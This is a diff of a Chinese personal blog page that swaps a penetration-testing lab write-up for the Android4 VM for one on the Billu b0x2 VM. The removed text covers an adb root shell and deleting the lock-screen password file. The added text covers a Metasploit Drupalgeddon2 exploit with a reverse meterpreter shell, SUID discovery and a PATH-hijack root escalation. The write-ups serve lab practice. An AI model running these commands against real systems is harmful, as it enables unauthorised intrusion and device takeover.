@@ -8,7 +8,7 @@
 <meta name="keywords" content="Gridea静态个人博客">
 <meta name="description" content="不问去留">
 <meta name="theme-color" content="#000">
-<title>渗透测试之Android4 | DAMOXILAI</title>
+<title>渗透测试之Billu b0x2 | DAMOXILAI</title>
 <link rel="shortcut icon" href="/favicon.ico?v=1629216276839">
 <link rel="stylesheet" href="/media/css/gemini.css">
 <link rel="stylesheet" href="/media/fonts/font-awesome.css">
@@ -41,7 +41,7 @@
 
 
 
-  <meta name="description" content="渗透测试之Android4" />
+  <meta name="description" content="渗透测试之Billu b0x2" />
   <meta name="keywords" content="内网渗透" />
 </head>
 
@@ -254,11 +254,10 @@
 *<br>
 *<br>
 * <a href="#1%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0">1.主机发现</a><br>
-* <a href="#2%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%89%AB%E6%8F%8F">2.进一步扫描</a><br>
-* <a href="#3%E8%AE%BF%E9%97%AE%E7%AB%AF%E5%8F%A3">3.访问端口</a><br>
-* <a href="#4%E6%89%AB%E6%8F%8F%E7%9B%AE%E5%BD%95">4.扫描目录</a><br>
-* <a href="#5%E5%88%A9%E7%94%A8%E5%85%B6%E4%BB%96%E7%AB%AF%E5%8F%A3">5.利用其他端口</a><br>
-* <a href="#6%E6%8F%90%E6%9D%83">6.提权</a></li>
+* <a href="#2%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3">2.扫描端口</a><br>
+* <a href="#3%E8%AE%BF%E9%97%AE%E7%BD%91%E9%A1%B5">3.访问网页</a><br>
+* <a href="#4drupal%E6%BC%8F%E6%B4%9E">4.Drupal漏洞</a><br>
+* <a href="#5%E6%8F%90%E6%9D%83">5.提权</a></li>
 <li><a href="#%E4%B8%89-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93">三、实验总结</a></li>
 </ul>
 </li>
@@ -527,8 +526,8 @@
           <div class="section bg-color post post-page">
             <section class="post-header">
   <h1 class="post-title">
-    <a class="post-title-link" href="https://damoxilai.github.io/post/nei-wang-shen-tou-zhi-android4/">
-      渗透测试之Android4
+    <a class="post-title-link" href="https://damoxilai.github.io/post/shen-tou-ce-shi-zhi-billu-b0x2/">
+      渗透测试之Billu b0x2
     </a>
   </h1>
   <div class="post-meta">
@@ -536,7 +535,7 @@
     <span class="meta-item pc-show">
       <i class="fa fa-calendar-o"></i>
       <span class="language" data-lan="publish">发布于</span>
-      <span class="publish-time" data-t="2021-08-17 11:42:37">2021-08-17</span>
+      <span class="publish-time" data-t="2021-08-18 00:00:03">2021-08-18</span>
       <span class="post-meta-divider pc-show">|</span>
     </span>
     
@@ -560,7 +559,7 @@
     <span class="meta-item">
       <span class="post-meta-divider">|</span>
       <i class="fa fa-file-word-o"></i>
-      <span>333<span class="pc-show language" data-lan="words">字数</span></span>
+      <span>439<span class="pc-show language" data-lan="words">字数</span></span>
     </span>
     
   </div>
@@ -573,50 +572,68 @@
 </ol>
 <h2 id="二-实验过程">二、实验过程</h2>
 <h5 id="1主机发现">1.主机发现</h5>
-<p>nma扫描，发现靶机192.168.0.102</p>
-<figure data-type="image" tabindex="1"><img src="https://damoxilai.github.io/post-images/1629171835270.png" alt="" loading="lazy"></figure>
-<h5 id="2进一步扫描">2.进一步扫描</h5>
-<pre><code>nmap -sV -p- -T5 192.168.0.102
+<p>扫描，发现靶机ip192.168.0.103</p>
+<figure data-type="image" tabindex="1"><img src="https://damoxilai.github.io/post-images/1629216074795.png" alt="" loading="lazy"></figure>
+<h5 id="2扫描端口">2.扫描端口</h5>
+<p>开放22、80、111、8080端口；linux系统<br>
+<img src="https://damoxilai.github.io/post-images/1629216087993.png" alt="" loading="lazy"></p>
+<h5 id="3访问网页">3.访问网页</h5>
+<figure data-type="image" tabindex="2"><img src="https://damoxilai.github.io/post-images/1629216096684.png" alt="" loading="lazy"></figure>
+<p>看到是“Drupal”框架大搭起来的网站</p>
+<h5 id="4drupal漏洞">4.Drupal漏洞</h5>
+<p>我们可以用msf5来搜索漏洞，依次输入以下命令</p>
+<pre><code>┌──(root💀kali)-[~/桌面]
+└─# msfconsole          
+
+msf6 &gt; search Drupal
+
+msf6 &gt; use exploit/unix/webapp/drupal_drupalgeddon2
+
+msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set RHOST 192.168.0.103
+
+msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set Payload php/meterpreter/reverse_tcp
+
+msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set LHOST 192.168.0.150
+
+msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit
 </code></pre>
-<p>可以看到5555、8080、22000端口开放，linux操作系统</p>
-<figure data-type="image" tabindex="2"><img src="https://damoxilai.github.io/post-images/1629171848128.png" alt="" loading="lazy"></figure>
-<h5 id="3访问端口">3.访问端口</h5>
-<figure data-type="image" tabindex="3"><img src="https://damoxilai.github.io/post-images/1629171856847.png" alt="" loading="lazy"></figure>
-<p><em><strong>提示有backdoor、post提交</strong></em></p>
-<h5 id="4扫描目录">4.扫描目录</h5>
-<pre><code>wfuzz -w /usr/share/wordlists/dirb/common.txt -u 192.168.0.102:8080/FUZZ.php --hc 404
+<p>获得shell</p>
+<figure data-type="image" tabindex="3"><img src="https://damoxilai.github.io/post-images/1629216104998.png" alt="" loading="lazy"></figure>
+<h5 id="5提权">5.提权</h5>
+<p>5.1上传脚本运行将meterpreter shell转为反弹shell</p>
+<p>下载地址:https://github.com/rebootuser/LinEnum</p>
+<pre><code>meterpreter &gt; upload /root/LinEnum.sh /tmp/
+[*] uploading  : /root/LinEnum.sh -&gt; /tmp/                                                                                        
+[*] uploaded   : /root/LinEnum.sh -&gt; /tmp//LinEnum.sh                                                                             
+meterpreter &gt; shell                                                                                                               
+Process 2208 created.                                                                                                             
+Channel 1 created.      
+
 </code></pre>
-<figure data-type="image" tabindex="4"><img src="https://damoxilai.github.io/post-images/1629171868337.png" alt="" loading="lazy"></figure>
-<p>可以发现backdoor.php</p>
-<p>访问后，只有一句话说是假的后门，检查网页源码也没有提示</p>
-<p><img src="https://damoxilai.github.io/post-images/1629171880871.png" alt="" loading="lazy"><br>
-根据前面提示POST数据试一下，不知道参数，无果</p>
-<h5 id="5利用其他端口">5.利用其他端口</h5>
-<p>开放了5555端口adb服务，又是Android，我们可以想到用adb连接</p>
-<p>kali机没有adb，需要下载安装</p>
-<pre><code> apt-get install android-tools-adb
+<figure data-type="image" tabindex="4"><img src="https://damoxilai.github.io/post-images/1629216115061.png" alt="" loading="lazy"></figure>
+<p>5.2在根目录下，寻找可提权程序</p>
+<pre><code>find / -perm -u=s -type f 2&gt;/dev/null
 </code></pre>
-<p>连接</p>
-<pre><code>┌──(root💀kali)-[~]
-└─# adb connect 192.168.0.102:5555   
-                 
-┌──(root💀kali)-[~]
-└─# adb  shell   
+<figure data-type="image" tabindex="5"><img src="https://damoxilai.github.io/post-images/1629216121658.png" alt="" loading="lazy"></figure>
+<p>发现/opt/s符合条件</p>
+<p>5.3strings查看</p>
+<p><img src="https://damoxilai.github.io/post-images/1629216130170.png" alt="" loading="lazy"><br>
+发现s会调用scp命令，并且为root权限。</p>
+<p>在/tmp目录下建立scp文件，赋予可执行权限，把它添加到环境变量中，这样执行/opt/s时，运行到scp时，就会执行我们在/tmp目录下建立的scp。</p>
+<p>写下scp，赋予权限</p>
+<pre><code>echo '/bin/bash' &gt; /tmp/scp                                  
+chmod +x /tmp/scp
 </code></pre>
-<figure data-type="image" tabindex="5"><img src="https://damoxilai.github.io/post-images/1629171893279.png" alt="" loading="lazy"></figure>
-<h5 id="6提权">6.提权</h5>
-<p>su命令</p>
-<figure data-type="image" tabindex="6"><img src="https://damoxilai.github.io/post-images/1629171899981.png" alt="" loading="lazy"></figure>
-<p>顺利拿到flag</p>
-<p>ANDROID{u_GOT_root_buddy}</p>
-<p>7.删除锁屏密码</p>
-<pre><code>cd /data/system
-rm -rf password.key
+<p>查看$PATH,把“/tmp”添加进变量</p>
+<pre><code>PATH=/tmp:$PATH
 </code></pre>
-<p>然后不用密码就可以进入andro系统<br>
-<img src="https://damoxilai.github.io/post-images/1629171910165.png" alt="" loading="lazy"></p>
+<figure data-type="image" tabindex="6"><img src="https://damoxilai.github.io/post-images/1629216138611.png" alt="" loading="lazy"></figure>
+<p>运行/opt/s；注意这里不用&quot;./&quot;直接文件名就运行</p>
+<figure data-type="image" tabindex="7"><img src="https://damoxilai.github.io/post-images/1629216145964.png" alt="" loading="lazy"></figure>
 <h2 id="三-实验总结">三、实验总结</h2>
-<p>实验诱导从网站后门进，实际是假后门，灵活变通很重要，想到有其他端口开放adb服务，不要一颗树上吊死；android的adb连接是基本操作，su就可提升为root；绕过改界面密码在/data/system/password.key文件处。</p>
+<p>(1)MSF需熟悉应用，直接搜索漏洞，也有写好的exploit脚本</p>
+<p>(2)meterpreter shell的实现，meterperter命令，包括meterperter shell转反弹shell</p>
+<p>(3)$PATH决定了shell将到那些目录中寻找命令或程序，修改$PATH是scp命令实现运行的关键</p>
 
             </div>
             
@@ -629,7 +646,7 @@ rm -rf password.key
     </li>
     <li class="post-copyright-link">
       <strong class="language" data-lan="link">本文链接：</strong>
-      <a href="https://damoxilai.github.io/post/nei-wang-shen-tou-zhi-android4/" title="渗透测试之Android4">https://damoxilai.github.io/post/nei-wang-shen-tou-zhi-android4/</a>
+      <a href="https://damoxilai.github.io/post/shen-tou-ce-shi-zhi-billu-b0x2/" title="渗透测试之Billu b0x2">https://damoxilai.github.io/post/shen-tou-ce-shi-zhi-billu-b0x2/</a>
     </li>
     <li class="post-copyright-license">
       <strong class="language" data-lan="copyright">版权声明： </strong>
@@ -644,15 +661,11 @@ rm -rf password.key
   <div class="nav">
     <div class="nav-prev">
       
-        <i class="fa fa-chevron-left"></i>
-        <a class="nav-pc-next" title="渗透测试之Billu b0x2" href="https://damoxilai.github.io/post/shen-tou-ce-shi-zhi-billu-b0x2/">渗透测试之Billu b0x2</a class="nav-pc-next">
-        <a class="nav-mobile-prev" title="渗透测试之Billu b0x2" href="https://damoxilai.github.io/post/shen-tou-ce-shi-zhi-billu-b0x2/">上一篇</a>
-      
     </div>
     <div class="nav-next">
       
-        <a class="nav-pc-next" title="渗透测试之Casino-Royale" href="https://damoxilai.github.io/post/1/">渗透测试之Casino-Royale</a>
-        <a class="nav-mobile-next" title="渗透测试之Casino-Royale" href="https://damoxilai.github.io/post/1/">下一篇</a>
+        <a class="nav-pc-next" title="渗透测试之Android4" href="https://damoxilai.github.io/post/nei-wang-shen-tou-zhi-android4/">渗透测试之Android4</a>
+        <a class="nav-mobile-next" title="渗透测试之Android4" href="https://damoxilai.github.io/post/nei-wang-shen-tou-zhi-android4/">下一篇</a>
         <i class="fa fa-chevron-right"></i>
       
     </div>
